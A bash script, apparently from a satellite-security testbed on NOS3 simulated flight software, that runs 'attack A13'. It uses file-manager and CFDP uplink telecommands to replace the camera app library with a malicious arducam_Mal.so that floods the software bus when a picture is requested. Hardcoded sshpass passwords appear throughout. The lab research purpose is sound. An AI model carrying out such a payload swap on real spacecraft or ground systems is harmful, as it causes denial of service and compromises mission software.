#!/bin/bash

source /home/nos3/Install_tools_nos3/IP_Scenario.sh

# arducam_Mal.so has been compiled on SAT1
# aim : flood the bus when asking a picture from ground via TC (100 packets, to verify)
# command to trigger : CAM_EXP3_CC

# rm/cp/mv version
#/usr/bin/sshpass -p nos3123! ssh -XY nos3@$IPSAT1 "rm /home/nos3/Desktop/github-nos3/fsw/build/exe/cpu1/cf/arducam.so"
#/usr/bin/sshpass -p nos3123! scp arducam_Mal.so nos3@$IPSAT1:/home/nos3/Desktop/github-nos3/fsw/build/exe/cpu1/cf/arducam_Mal.so    # for more realistic attack use CFDP TC (not working with NOS3 v1.6.2)
#/usr/bin/sshpass -p nos3123! ssh -XY nos3@$IPSAT1 "mv /home/nos3/Desktop/github-nos3/fsw/build/exe/cpu1/cf/arducam_Mal.so /home/nos3/Desktop/github-nos3/fsw/build/exe/cpu1/cf/arducam.so"

# FM / CFDP version 
/usr/bin/sshpass -p nos3123! ssh -XY nos3@$IPMCS "cd /home/nos3/Input_Generator; python3 Main.py send scenarios/FM_rm.json --port 6010" # remove arducam.so using FM
echo "1) remove CAM App arducam.so"
sleep 1
/usr/bin/sshpass -p nos3123! scp arducam_Mal.so nos3@$IPMCS:/home/nos3/Desktop/github-nos3/fsw/build/exe/cpu1/cf/arducam_Mal.so  # copy arducam_Mal.so in /cf of MCS
/usr/bin/sshpass -p nos3123! ssh -XY nos3@$IPMCS "cd /home/nos3/Input_Generator; python3 Main.py send scenarios/uplinkCFDP_A13.json --port 6010" # Request CFDP uplink of the malicious arducam_Mal.so
echo "2) load malicious CAM App"
sleep 3
/usr/bin/sshpass -p nos3123! ssh -XY nos3@$IPMCS "cd /home/nos3/Input_Generator; python3 Main.py send scenarios/FM_mv_A13.json --port 6010" # mv arducam_Mal.so to arducam.so using FM
echo "3) replace CAM App with malicious"
echo "4) flood the bus when asking a picture from ground via TC"
sleep 1

#restart the camera for the new .so to take effect
python3 Attack_A13.py

## NB: don't forget to reset nominal version of .so after the attack !


    
    





